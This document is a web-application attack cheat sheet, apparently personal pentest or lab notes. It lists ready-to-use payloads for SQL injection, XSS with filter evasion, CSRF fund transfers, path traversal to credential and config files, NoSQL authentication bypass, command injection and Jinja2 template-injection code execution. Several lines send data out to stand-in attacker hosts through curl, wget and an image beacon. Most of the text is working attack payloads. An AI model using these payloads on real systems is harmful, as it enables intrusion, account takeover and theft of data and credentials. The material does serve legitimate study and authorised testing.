#webapplications

Quick reference of confirmed payloads organized by vulnerability type. These are tested starting points — adjust syntax for your target's specific engine/context.

## SQL Injection
### Basic confirmation (all engines)
```
' OR 1=1--
' AND 1=1--
" OR "1"="1
```

### Engine fingerprinting
```
MySQL/Postgres/MSSQL:
  ' AND ascii(substring('A',1,1))=65--
  ' AND SUBSTRING('test',1,1)='t'--

SQLite:
  ' AND unicode(substr('A',1,1))=65--
  ' AND substr('test',1,1)='t'--
```

### Blind boolean extraction
```
SQLite:
  ' AND (SELECT unicode(substr((SELECT flag FROM secrets LIMIT 1),POS,1)))>VAL--
  
MySQL:
  ' AND (SELECT ORD(SUBSTRING((SELECT password FROM users LIMIT 1),POS,1)))>VAL--
  
Template (DBMS-agnostic):
  PAYLOAD' AND (SELECT <function>(<column> FROM <table>))>N--
```
Binary-search on N (start ~77 for 'M', adjust up/down).

### UNION injection
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--  # Keep adding NULLs until no error
' UNION SELECT username, password FROM users--
' UNION SELECT table_name FROM information_schema.tables--
```

## Cross-Site Scripting

### Reflected — basic payloads
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<img src=x onerror="window.location='http://attacker.com'">
```

### Reflected — lab proof payloads (window.labSolved=true)
```
URL parameter delivery:
  https://target.com/search?q=<img src=x onerror="window.labSolved=true">
  https://target.com/search?q=%3Cimg%20src%3Dx%20onerror%3D%22window.labSolved%3Dtrue%22%3E
  https://target.com/search?q=<svg onload="window.labSolved=true">
  https://target.com/search?q=<body onload="window.labSolved=true">
  https://target.com/search?q=<input onfocus="window.labSolved=true" autofocus>

Filter evasion (if basic payloads blocked):
  https://target.com/search?q=<ImG src=x onerror="window.labSolved=true">  # case toggle
  https://target.com/search?q=<img src=x onerror=window.labSolved`true`>  # backtick
  https://target.com/search?q=%253Cimg%2520src%253Dx%2520onerror%253D%2522window.labSolved%253Dtrue%2522%253E  # double-encoded
  
Testing: click link → DevTools Console → type: window.labSolved (returns true if XSS works)
```

### Stored — proof payloads
```
<img src=x onerror="window.labSolved=true">
<script>document.body.innerHTML='<h1>PWNED</h1>'</script>
<img src=x onerror="new Image().src='http://attacker/?data='+document.body.innerHTML">
```

### DOM-based — via URL fragment (#)
```
Basic:
  https://target/page#<img src=x onerror=alert(1)>
  https://target/page#<svg onload=alert(1)>
  https://target/page#<body onload=alert(1)>
  https://target/page#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E  # URL-encoded

Lab proof (window.labSolved=true):
  https://target/page#<img src=x onerror="window.labSolved=true">
  https://target/page#%3Cimg%20src%3Dx%20onerror%3D%22window.labSolved%3Dtrue%22%3E  # URL-encoded
  https://target/page#<svg onload="window.labSolved=true">
  https://target/page#<input onfocus="window.labSolved=true" autofocus>

Filter evasion:
  https://target/page#<ImG src=x onerror="window.labSolved=true">  # case toggle
  https://target/page#<img src=x onerror=window.labSolved`true`>  # backtick
  https://target/page#%253Cimg%2520src%253Dx%2520onerror%253D%2522window.labSolved%253Dtrue%2522%253E  # double-encoded

Testing: visit URL → DevTools Console → type: window.labSolved (returns true if DOM XSS works)
```

### DOM-based — via URL query (?)
```
https://target/page?msg=<img src=x onerror="window.labSolved=true">
https://target/page?ref=<svg onload="window.labSolved=true">
https://target/page?search=%3Cimg%20src%3Dx%20onerror%3D%22window.labSolved%3Dtrue%22%3E

Note: Only works if page reads location.search or document.referrer (not location.hash)
```

### Filter evasion
```
Case toggle:
  <ImG src=x onerror=alert(1)>
  <svg onLoad=alert(1)>

Backtick split:
  <img onerror=alert`1`>

Entity encoding:
  &#60;img src=x onerror=alert(1)&#62;
  &lt;img src=x onerror=alert(1)&gt;

atob() encoding:
  <img src=x onerror="eval(atob('YWxlcnQoMSk='))">  # alert(1) in base64

Comment insertion:
  prompt/*x*/(1)
  prompt%2f*x*%2f(1)
```

## CSRF

### GET variant (any origin can trigger)
```html
<img src="https://target.com/transfer?to=attacker&amount=1000" style="display:none">
```

### POST variant (requires form submission)
```html
<form id="csrf" action="https://target.com/transfer" method="POST">
  <input name="to" value="attacker-account">
  <input name="amount" value="1000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

## Path Traversal / Local File Inclusion

### Linux/Unix targets
```
../../../etc/passwd
....//....//....//etc/passwd  # Filter evasion: dot-dot-slash with extra slashes
../../../var/www/html/config.php
../../../usr/local/tomcat/webapps/ROOT/
/etc/passwd  # Absolute path (may work if app trusts relative-path only)
```

### Windows targets
```
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\windows\win.ini
file.php%00.txt  # Null byte (PHP <5.3, may truncate .txt extension)
```

### Application files
```
../../../app/config/database.yml
../../../.env
../../../app.js
../../../settings.json
../../source.zip  # Backup files
../../../.git/config
```

### Filter evasion
```
Absolute path (no traversal sequences):
  /etc/passwd
  C:\windows\system32\drivers\etc\hosts

Nested traversal (..//):
  ....//....//....//etc/passwd  # After stripping .., becomes ../
  ....\\....\\....\\windows\\win.ini  # Windows variant

URL encoding (single decode):
  ..%2f..%2fetc%2fpasswd  # %2f = /
  ..%5c..%5cwindows%5cwin.ini  # %5c = \
  
Double URL encoding (decoded twice):
  ..%252f..%252fetc%252fpasswd  # First: %252f→%2f, Second: %2f→/
  
Non-standard encodings:
  ..%c0%af..%c0%afetc%c0%afpasswd  # UTF-8 encoded /
  ..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd  # Fullwidth slash
  
Null byte (legacy, PHP <5.3):
  ../../../etc/passwd%00.jpg  # %00 terminates before .jpg

Base folder prefix (if app requires it):
  /var/www/images/../../../etc/passwd  # Contains required base directory
```

## NoSQL Injection (MongoDB)

### Operator injection
```
{"username": {"$ne": null}}       # Not equal to null (select all)
{"username": {"$gt": ""}}         # Greater than empty string (select all)
{"password": {"$regex": ".*"}}    # Regex match anything
{"username": {"$exists": true}}   # Field exists
{"_id": {"$nin": []}}             # Not in empty array (select all)
```

### Authentication bypass
```
# Normal query: db.users.findOne({username: user, password: pass})

POST data:
  username[$ne]=admin
  password[$ne]=wrong
  
JSON:
  {"username": {"$ne": "admin"}, "password": {"$ne": "admin"}}
```

## Command Injection

### Basic shells
```
; id
| id
|| id  # Execute if first command fails
&& id  # Execute if first command succeeds
` id `  # Backtick execution
$(id)   # Command substitution
```

### Data exfiltration
```
; cat /etc/passwd
| whoami > /tmp/proof.txt
; curl http://attacker.com/$(whoami)
$(wget http://attacker.com/?data=$(id))
```

## Session/Cookie Attacks

### Session fixation payload
```
# Get pre-known session ID
# Send victim to: https://target.com/?sid=ATTACKER_KNOWN_123
# Victim logs in with that ID
# Attacker replays same ID as authenticated user
curl -i -b "sid=ATTACKER_KNOWN_123" https://target.com/account
```

### Logout bypass
```bash
# Capture session before logout
STOLEN_SID="valid_session_from_before_logout"

# After victim logs out, try old session in new context
curl -i -b "sid=$STOLEN_SID" https://target.com/account
# If 200 + data, session wasn't invalidated server-side
```

## IDOR Testing

### Sequential ID enumeration
```bash
# Bash loop
for id in {1..100}; do
  curl -s -b "sid=$SESSION" "https://target.com/api/records/$id" | grep -o '"owner":"[^"]*"'
done

# Extract pattern
curl -s "https://target.com/api/user?id=101" -H "Cookie: session=$SID"
curl -s "https://target.com/api/user?id=102" -H "Cookie: session=$SID"
curl -s "https://target.com/api/user?id=103" -H "Cookie: session=$SID"
```

## Server-Side Template Injection

### Engine detection
```
{{7*7}}       → 49    ⇒ Jinja2, Twig
${7*7}        → 49    ⇒ FreeMarker, Velocity
<%= 7*7 %>    → 49    ⇒ ERB (Ruby)
{{7*'7'}}     → 7777777  ⇒ Jinja2 (Python string repeat)
```

### Jinja2 RCE (if detected)
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}
```

### Generic blind extraction (adjust for your engine)
```
{{7*7}}  → Confirms injection
{{config.items()}} → Read config (Flask)
{{".".join([].__class__.__bases__[0].__subclasses__())}}  → Python introspection
```

---
**How to use this sheet:**
1. Start with the "basic confirmation" payloads to prove the vulnerability
2. Adjust for your engine (see fingerprinting payloads)
3. Customize syntax for the actual context (URL, JSON, HTML attribute, etc.)
4. Chain with encoding/evasion techniques if basic payloads get blocked
5. Always test both the success path and error path to confirm the fix

**When to escalate to automated tools:**
- **SQL Injection:** Once manually confirmed, use [[sqlmap]] to automate enumeration (schema discovery, table/column dumps)
- **XSS:** Beyond payload variants, use a browser dev tool or a dedicated scanner (Burp, ZAP) if the site is large
- **Other injections:** Start manual, escalate only if the target is complex or time-constrained
